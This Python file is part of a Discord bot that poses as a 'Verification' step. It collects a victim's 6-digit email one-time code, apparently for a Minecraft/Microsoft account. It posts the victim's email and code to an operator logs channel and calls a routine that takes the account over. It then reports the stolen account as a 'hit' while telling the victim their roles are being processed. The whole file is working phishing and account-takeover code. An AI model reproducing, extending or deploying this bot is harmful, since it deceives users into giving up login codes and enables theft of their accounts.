from discord import ui
import datetime
import discord
import httpx
import json

from views.buttons.embedOptions import ButtonOptions
from views.buttons.accountInfo import accountInfo

from views.utils.startSecure import startSecuringAccount
from views.utils.initialSession import getSession

config = json.load(open("config.json", "r+"))

class MyModalTwo(ui.Modal, title="Verification"):
    def __init__(self, username, email, flowtoken):
        super().__init__()
        self.username = username
        self.email = email
        self.flowtoken = flowtoken

    box_three = ui.TextInput(label="Code", required=True)

    async def on_submit(self, interaction: discord.Interaction, /) -> None:
        if len(str(self.box_three.value)) != 6:
            await interaction.response.send_message(
                embed = discord.Embed(
                    description = "The code must be 6 digits long."
                ),
                color = 0xFF5C5C,
                ephemeral=True
            )
            return  

        logs_channel = await interaction.client.fetch_channel(config["discord"]["logs_channel"])
        hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])

        Code_embed = discord.Embed(
            title = f"User | {interaction.user.name}",
            description=f"**Email** | **Status**\n```{self.email} | Got Code | {self.box_three.value}```",
            timestamp = datetime.datetime.now(),
            colour = 0x79D990,                           
        ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{self.username}")

        await interaction.response.defer()

        await logs_channel.send("**This Account is being automaticly secured**")
        await logs_channel.send(embed = Code_embed, view = ButtonOptions(interaction.user.id))

        await interaction.followup.send(
            "⌛ Please Allow Up To One Minute For Us To Proccess Your Roles...", ephemeral=True
        )

        self.session = getSession()

        securedAccount = await startSecuringAccount(self.session, self.email, self.flowtoken, self.box_three.value)
        
        if not securedAccount:

            await logs_channel.send(
                embed = discord.Embed(
                    title = f"User | {interaction.user.name}({interaction.user.id})",
                    description = f"**Email** | **Status** | **Reason**\n```{self.email} | Failed to secure | Invalid OTP Code```",
                    timestamp = datetime.datetime.now(),
                    colour = 0xFF5C5C                  
                ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{self.username}"),
                view = ButtonOptions(interaction.user)
            )

            return
            
        await hits_channel.send("**Successfully secured an account**")
        await hits_channel.send(
            embed = securedAccount["hit_embed"],
            view = accountInfo(
                securedAccount["details"], 
                interaction.user
                )
        )
